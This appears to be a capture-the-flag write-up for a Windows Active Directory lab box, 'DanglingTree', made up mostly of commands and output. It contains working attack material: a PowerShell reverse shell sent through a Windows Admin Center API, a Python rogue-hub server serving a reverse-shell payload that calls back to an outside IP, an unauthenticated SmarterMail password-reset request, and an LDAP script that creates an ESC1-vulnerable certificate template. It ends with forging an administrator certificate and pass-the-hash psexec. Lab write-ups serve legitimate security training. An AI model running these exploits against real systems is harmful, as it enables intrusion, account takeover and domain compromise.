
<img src="Pasted%20image%2020260810181310.png" width="228" alt="Pasted image 20260810181310">

# Attack Chain



# Summary

- [Enumeration](#enumeration)



---
# Enumeration

## Nmap

```
nmap -sVC 10.129.62.120 -oA scan/Dangling
Starting Nmap 7.93 ( https://nmap.org ) at 2026-08-10 18:14 CEST
Stats: 0:01:40 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 92.86% done; ETC: 18:16 (0:00:06 remaining)
Nmap scan report for 10.129.62.120
Host is up (0.36s latency).
Not shown: 986 filtered tcp ports (no-response)
PORT     STATE SERVICE            VERSION
53/tcp   open  domain             Simple DNS Plus
80/tcp   open  http               Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec       Microsoft Windows Kerberos (server time: 2026-08-09 23:19:08Z)
135/tcp  open  msrpc              Microsoft Windows RPC
139/tcp  open  netbios-ssn        Microsoft Windows netbios-ssn
389/tcp  open  ldap               Microsoft Windows Active Directory LDAP (Domain: danglingtree.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc.danglingtree.htb, DNS:danglingtree.htb, DNS:DANGLINGTREE
| Not valid before: 2026-08-03T16:32:53
|_Not valid after:  2106-08-03T16:32:53
|_ssl-date: TLS randomness does not represent time
443/tcp  open  ssl/http           Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| ssl-cert: Subject: commonName=danglingtree-DC-CA
| Not valid before: 2026-03-26T05:34:19
|_Not valid after:  2114-03-26T05:44:18
| http-methods:
|_  Potentially risky methods: TRACE
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Microsoft-IIS/10.0
| tls-alpn:
|_  http/1.1
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http         Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc.danglingtree.htb, DNS:danglingtree.htb, DNS:DANGLINGTREE
| Not valid before: 2026-08-03T16:32:53
|_Not valid after:  2106-08-03T16:32:53
|_ssl-date: TLS randomness does not represent time
3268/tcp open  ldap               Microsoft Windows Active Directory LDAP (Domain: danglingtree.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc.danglingtree.htb, DNS:danglingtree.htb, DNS:DANGLINGTREE
| Not valid before: 2026-08-03T16:32:53
|_Not valid after:  2106-08-03T16:32:53
3269/tcp open  ssl/ldap           Microsoft Windows Active Directory LDAP (Domain: danglingtree.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc.danglingtree.htb, DNS:danglingtree.htb, DNS:DANGLINGTREE
| Not valid before: 2026-08-03T16:32:53
|_Not valid after:  2106-08-03T16:32:53
|_ssl-date: TLS randomness does not represent time
3389/tcp open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=dc.danglingtree.htb
| Not valid before: 2026-03-25T05:48:29
|_Not valid after:  2026-09-24T05:48:29
| rdp-ntlm-info:
|   Target_Name: DANGLINGTREE
|   NetBIOS_Domain_Name: DANGLINGTREE
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: danglingtree.htb
|   DNS_Computer_Name: dc.danglingtree.htb
|   DNS_Tree_Name: danglingtree.htb
|   Product_Version: 10.0.26100
|_  System_Time: 2026-08-09T23:21:08+00:00
|_ssl-date: TLS randomness does not represent time
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Domain = `danglingtree.htb`
FQDN = `DC.danglingtree.htb`

```
echo '10.129.62.120 danglingtree.htb DC.danglingtree.htb DC' | tee -a /etc/hosts 
```

## SMB

```
nxc smb 10.129.62.120 -u '' -p ''
SMB         10.129.62.120   445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:danglingtree.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.62.120   445    DC               [+] danglingtree.htb\:
```

Cant list shares and users (rid brute included)

```
nxc smb 10.129.62.120 -u 'guest' -p ''
SMB         10.129.62.120   445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:danglingtree.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.62.120   445    DC               [+] danglingtree.htb\guest:
```

```
nxc smb 10.129.62.120 -u 'guest' -p '' --shares
SMB         10.129.62.120   445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:danglingtree.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.62.120   445    DC               [+] danglingtree.htb\guest:
SMB         10.129.62.120   445    DC               [*] Enumerated shares
SMB         10.129.62.120   445    DC               Share           Permissions     Remark
SMB         10.129.62.120   445    DC               -----           -----------     ------
SMB         10.129.62.120   445    DC               ADMIN$                          Remote Admin
SMB         10.129.62.120   445    DC               C$                              Default share
SMB         10.129.62.120   445    DC               IPC$            READ            Remote IPC
SMB         10.129.62.120   445    DC               IT              READ
SMB         10.129.62.120   445    DC               NETLOGON                        Logon server share
SMB         10.129.62.120   445    DC               SYSVOL                          Logon server share
```

```
smbclientng -d "danglingtree.htb" -u "guest" -p '' --host "10.129.62.120"
               _          _ _            _
 ___ _ __ ___ | |__   ___| (_) ___ _ __ | |_      _ __   __ _
/ __| '_ ` _ \| '_ \ / __| | |/ _ \ '_ \| __|____| '_ \ / _` |
\__ \ | | | | | |_) | (__| | |  __/ | | | ||_____| | | | (_| |
|___/_| |_| |_|_.__/ \___|_|_|\___|_| |_|\__|    |_| |_|\__, |
    by @podalirius_                             v3.0.0  |___/

  | Provide a password for 'danglingtree.htb\guest':
[+] Successfully authenticated to '10.129.62.120' as 'danglingtree.htb\guest'!
■[\\10.129.62.120\]> use IT
■[\\10.129.62.120\IT\]> tree
└── Security/
    └── DanglingTree_RoE_Assessment.pdf
■[\\10.129.62.120\IT\]> cd Security
■[\\10.129.62.120\IT\Security\]> get DanglingTree_RoE_Assessment.pdf
```

Pentest report

![Pasted image 20260810183423](Pasted%20image%2020260810183423.png)

```
nxc smb 10.129.62.120 -u 'anderson.w' -p 'R3dT3am@Acc3ss#01'
SMB         10.129.62.120   445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:danglingtree.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.62.120   445    DC               [+] danglingtree.htb\anderson.w:R3dT3am@Acc3ss#01
```

user valid
# Kerb & AS-REP

```
nxc ldap 10.129.62.120 -u 'anderson.w' -p 'R3dT3am@Acc3ss#01' --kerberoasting kerb.txt
LDAP        10.129.62.120   389    DC               [*] Windows 11 / Server 2025 Build 26100 (name:DC) (domain:danglingtree.htb) (signing:Enforced) (channel binding:Never)
LDAP        10.129.62.120   389    DC               [+] danglingtree.htb\anderson.w:R3dT3am@Acc3ss#01
LDAP        10.129.62.120   389    DC               No entries found!
[Aug 10, 2026 - 18:37:06 (CEST)] exegol-htb /workspace # nxc ldap 10.129.62.120 -u 'anderson.w' -p 'R3dT3am@Acc3ss#01' --asreproast asrep.txt
LDAP        10.129.62.120   389    DC               [*] Windows 11 / Server 2025 Build 26100 (name:DC) (domain:danglingtree.htb) (signing:Enforced) (channel binding:Never)
LDAP        10.129.62.120   389    DC               [+] danglingtree.htb\anderson.w:R3dT3am@Acc3ss#01
LDAP        10.129.62.120   389    DC               No entries found!
```

# Certighost

Marche pas

```
python3 certighost.py -d 'danglingtree.htb' -u 'anderson.w' -p 'R3dT3am@Acc3ss#01' --dc-ip 10.129.62.120
[*] Connecting to LDAPS
[*] Detecting infrastructure
    DC: 10.129.62.120 | CA: danglingtree-DC-CA (10.129.62.120)
    Target: DC$ | SID: S-1-5-21-4220238332-57023728-1129110646-1000
[*] Creating computer: GHOSTNVWZNMTA$
[!] Computer creation failed: Authenticating account's machine account quota exceeded!
```

# Admin center - nmap full scan


```
6600/tcp  open  ssl/mshvlm?
```

![Pasted image 20260810185859](Pasted%20image%2020260810185859.png)

Crdentials for anderson.w worked

![Pasted image 20260810190151](Pasted%20image%2020260810190151.png)
Clicking on Gateway made a POST request to the following

https://danglingtree.htb:6600/api/services/WinREST/PowerShell/nodes/dc/invokeCommand

Burp

Found the body

```
{
  "properties": {
    "script": "<raw PowerShell here>",
    "command": "Get-WACSMServerConnectionStatus",
    "module": "Microsoft.SME.ServerManager",
    "state": "ready",
    "useInProcRunspace": false,
    "invokeMode": "Polling"
  }
}
```

Modifying the script to a reverseh shell we obtained the session

```
penelope -i tun0 -p 6767
[+] Listening for reverse shells on 10.10.16.113:6767
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] [New Reverse Shell] => danglingtree.htb 10.129.62.120 WINDOWS 👤 danglingtree\anderson.w 😍️ Session ID <1>
[+] Added readline support...
[+] Interacting with session [1] • Readline • Menu key Ctrl-D ⇐
[+] Session log: /root/.penelope/sessions/danglingtree.htb~10.129.62.120-WINDOWS/2026_08_10-19_04_58-729-danglingtree_anderson.w.log
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
PS C:\Users\anderson.w\Documents>
```



```
PS C:\Users\anderson.w\Desktop> Invoke-RestMethod -Uri "http://127.0.0.1:17017/api/v1/auth/force-reset-password" -Method Post -Body '{"IsSysAdmin":"true","OldPassword":"whatever","Username":"svc_mail","NewPassword":"NewPassword123!@#","ConfirmPassword":"NewPassword123!@#"}' -ContentType "application/json" -UseBasicParsing


username   :
errorCode  :
errorData  :
debugInfo  : check1
             check2
             check3
             check4.2
             check5.2
             check6.2
             check7.2
             check8.2

success    : True
resultCode : 200

```

```
Invoke-RestMethod -Uri "http://127.0.0.1:17017/api/v1/auth/authenticate-user" -Method Post -Body '{"username":"svc_mail","password":"NewPassword123!@#"}' -ContentType "application/json" -UseBasicParsing

<SNIP>
```



test.py
```
#!/usr/bin/env python3
from http.server import BaseHTTPRequestHandler, HTTPServer
import json

PAYLOAD = "powershell -nop -w hidden -c \"$c=New-Object System.Net.Sockets.TCPClient('10.10.16.113',6767);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String)+'PS '+(pwd).Path+'> ';$sy=([text.encoding]::ASCII).GetBytes($sb);$s.Write($sy,0,$sy.Length);$s.Flush()};$c.Close()\""

class Handler(BaseHTTPRequestHandler):
    def _send_json(self, code, obj):
        data = json.dumps(obj).encode("utf-8")
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def do_POST(self):
        resp = {
            "ClusterID": "f0e12780-f462-4b51-a7db-149f1d56209c",
            "SharedSecret": "any-value",
            "TargetHubs": {"a": "b"},
            "IsStandby": False,
            "SystemMount": {
                "Enabled": True,
                "ReadOnly": False,
                "MountPath": "C:\\\\",
                "CommandMount": PAYLOAD
            },
            "SystemAdminUsernames": ["admin"]
        }
        self._send_json(200, resp)

HTTPServer(('0.0.0.0', 8888), Handler).serve_forever()
```

```
python3 test.py
10.129.62.120 - - [10/Aug/2026 19:15:25] "POST /web/api/node-management/setup-initial-connection HTTP/1.1" 200 -
```


```
Invoke-RestMethod -Uri "http://127.0.0.1:17017/api/v1/settings/sysadmin/connect-to-hub" -Method Post -Body '{"hubAddress":"http://10.10.16.113:8888","oneTimePassword":"x","nodeName":"x"}' -ContentType "application/json" -UseBasicParsing
```


# Pivot to noah

```
PS C:\Program Files (x86)\SmarterTools\SmarterMail\Service\Settings> ls


    Directory: C:\Program Files (x86)\SmarterTools\SmarterMail\Service\Settings


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          8/9/2026   5:15 PM                Archived Data
d-----         3/27/2026   3:32 PM                Logs
d-----         3/25/2026  11:23 PM                SmartHostCaches
d-----          8/9/2026   5:19 PM                Stats
-a----          8/9/2026   5:15 PM            896 administrators.json
-a----         3/27/2026   6:19 PM            730 auth-tokens.sbin
-a----         3/27/2026   6:02 PM              0 avatarcache.txt
-a----          8/9/2026   5:15 PM           7509 common-passwords.json
-a----         3/27/2026   5:23 PM            1c43 domains.json
-a----         3/25/2026  11:23 PM          13001 events.json
-a----         3/26/2026  12:12 AM            770 greylist-filters.json
-a----         3/26/2026  12:00 AM             36 ids-blocks.json
-a----         3/25/2026  11:24 PM            253 ip-access.sbin
-a----          8/9/2026   2:10 PM          38641 settings.json
```
settings.json
```
"password_encrypted": "66e7ppLOBF7UdzDv7zK6MJ1rmyUb1Cby"
```


Noah password through reverse

**`RiverDragon#Storm25`**


```
nxc smb 10.129.62.120 -u 'noah.b' -p 'RiverDragon#Storm25'
SMB         10.129.62.120   445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:danglingtree.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.62.120   445    DC               [+] danglingtree.htb\noah.b:RiverDragon#Storm25
```

No winrm and rdp

Run command through svc_mail revshell.

```
$psi = New-Object System.Diagnostics.ProcessStartInfo
$psi.FileName = "cmd.exe"
$psi.Arguments = "/c type C:\Users\noah.b\Desktop\user.txt"
$psi.UserName = "noah.b"
$psi.Password = (ConvertTo-SecureString 'RiverDragon#Storm25' -AsPlainText -Force)
$psi.Domain = "danglingtree"
$psi.UseShellExecute = $false
$psi.RedirectStandardOutput = $true
$psi.RedirectStandardError = $true
$psi.WorkingDirectory = "C:\Windows\Temp"
$proc = [System.Diagnostics.Process]::Start($psi)
$proc.WaitForExit()
$proc.StandardOutput.ReadToEnd()
```




# DPAPI extract


flemme de le faire mais ca recup les creds de alex.o


# Force change pass

```
bloodyAD --host 10.129.62.120 -d danglingtree.htb -u alex.o -p 'SunsetMountainPeak@2025' set password jake.h 'NewPassword123!@#'
[+] Password changed successfully!
```


# ESC01 with jake

ESC1 sur template



```
bloodyAD --host 10.129.62.120 -d danglingtree.htb -u jake.h -p 'NewPassword123!@#' \
  get object "CN=danglingtree-DC-CA,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb" \
  --attr certificateTemplates

distinguishedName: CN=danglingtree-DC-CA,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb
certificateTemplates: RemoteAccessVPN; EmployeeAuthTemplate; VPNUserTemplate; DirectoryEmailReplication; DomainControllerAuthentication; KerberosAuthentication; EFSRecovery; EFS; DomainController; WebServer; Machine; User; SubCA; Administrator
```

script to create template
```
#!/usr/bin/env python3
import ssl, random
from ldap3 import Server, Connection, ALL, NTLM, Tls

DC_IP = "10.129.62.120"
DOMAIN = "danglingtree.htb"
USERNAME = "jake.h"
PASSWORD = "NewPassword123!@#"
BASE_DN = "DC=danglingtree,DC=htb"
TEMPLATES_DN = f"CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,{BASE_DN}"
SOURCE_TEMPLATE_DN = f"CN=User,{TEMPLATES_DN}"
NEW_TEMPLATE_NAME = "RemoteAccessVPN"
NEW_TEMPLATE_DN = f"CN={NEW_TEMPLATE_NAME},{TEMPLATES_DN}"

# LDAPS required: LDAP signing is enforced on this DC, and plain LDAP simple
# binds are rejected with "strongerAuthRequired" unless TLS is already active.
tls_config = Tls(validate=ssl.CERT_NONE)
server = Server(DC_IP, port=636, use_ssl=True, tls=tls_config, get_info=ALL)
conn = Connection(server, user=f"{DOMAIN}\\{USERNAME}", password=PASSWORD, authentication=NTLM)
conn.bind()

attrs_wanted = [
    'objectClass', 'flags', 'revision', 'showInAdvancedViewOnly',
    'pKIDefaultKeySpec', 'pKIKeyUsage', 'pKIMaxIssuingDepth',
    'pKICriticalExtensions', 'pKIExpirationPeriod', 'pKIOverlapPeriod',
    'pKIDefaultCSPs', 'msPKI-Minimal-Key-Size', 'msPKI-Private-Key-Flag',
    'msPKI-Template-Schema-Version', 'msPKI-Template-Minor-Revision',
    'msPKI-RA-Signature', 'msPKI-Enrollment-Flag'
]
conn.search(SOURCE_TEMPLATE_DN, '(objectClass=pKICertificateTemplate)', attributes=attrs_wanted)
raw = conn.response[0]['raw_attributes']

new_cert_oid = f"1.3.6.1.4.1.311.21.8.{random.randint(1000000,9999999)}.{random.randint(100000,999999)}.1.1"

new_attrs = {
    'objectClass': raw['objectClass'],
    'cn': [NEW_TEMPLATE_NAME.encode()],
    'displayName': [NEW_TEMPLATE_NAME.encode()],
    'flags': raw['flags'],
    'revision': raw['revision'],
    'showInAdvancedViewOnly': raw['showInAdvancedViewOnly'],
    'pKIDefaultKeySpec': raw['pKIDefaultKeySpec'],
    'pKIKeyUsage': raw['pKIKeyUsage'],
    'pKIMaxIssuingDepth': raw['pKIMaxIssuingDepth'],
    'pKICriticalExtensions': raw['pKICriticalExtensions'],
    'pKIExpirationPeriod': raw['pKIExpirationPeriod'],
    'pKIOverlapPeriod': raw['pKIOverlapPeriod'],
    'pKIDefaultCSPs': raw['pKIDefaultCSPs'],
    'msPKI-Minimal-Key-Size': raw['msPKI-Minimal-Key-Size'],
    'msPKI-Private-Key-Flag': raw['msPKI-Private-Key-Flag'],
    'msPKI-Template-Schema-Version': raw['msPKI-Template-Schema-Version'],
    'msPKI-Template-Minor-Revision': raw['msPKI-Template-Minor-Revision'],
    'msPKI-RA-Signature': raw['msPKI-RA-Signature'],
    'msPKI-Enrollment-Flag': raw['msPKI-Enrollment-Flag'],
    # --- ESC1-vulnerable overrides ---
    'msPKI-Certificate-Name-Flag': [1],                     # CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT
    'pKIExtendedKeyUsage': ['1.3.6.1.5.5.7.3.2'.encode()],   # Client Authentication EKU
    'msPKI-Cert-Template-OID': [new_cert_oid.encode()],
}

conn.add(NEW_TEMPLATE_DN, attributes=new_attrs)
```



```
bloodyAD --host 10.129.62.120 -d danglingtree.htb -u jake.h -p 'NewPassword123!@#' \
  add genericAll "CN=RemoteAccessVPN,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb" jake.h
[+] jake.h has now GenericAll on CN=RemoteAccessVPN,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb
```

```
certipy req -u jake.h -p 'NewPassword123!@#' -dc-ip 10.129.62.120 \
  -ca danglingtree-DC-CA -template RemoteAccessVPN \
  -upn administrator@danglingtree.htb \
  -sid S-1-5-21-4220238332-57023728-1129110646-500
  
[*] Requesting certificate via RPC
[*] Request ID is 18
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@danglingtree.htb'
[*] Certificate object SID is 'S-1-5-21-4220238332-57023728-1129110646-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```


```
certipy auth -pfx administrator.pfx -dc-ip 10.129.62.120
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@danglingtree.htb'
[*]     SAN URL SID: 'S-1-5-21-4220238332-57023728-1129110646-500'
[*]     Security Extension SID: 'S-1-5-21-4220238332-57023728-1129110646-500'
[*] Using principal: 'administrator@danglingtree.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@danglingtree.htb': aad3b435b51404eeaad3b435b51404ee:8cacb3a97e460c65d105ca7cd9913925
```


```
psexec.py -hashes :"8cacb3a97e460c65d105ca7cd9913925" "danglingtree.htb"/"administrator"@"10.129.62.120"
Impacket v0.14.0.dev0+20260810.115528.2dae5c7f - Copyright Fortra, LLC and its affiliated companies

[*] Requesting shares on 10.129.62.120.....
[*] Found writable share ADMIN$
[*] Uploading file SIJNOuZA.exe
[*] Opening SVCManager on 10.129.62.120.....
[*] Creating service MuSr on 10.129.62.120.....
[*] Starting service MuSr.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.26100.33158]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\System32> type C:\Users\Administrator\Desktop\root.txt
e15d07a5cd9498495c15c17ea5c5ffa0
```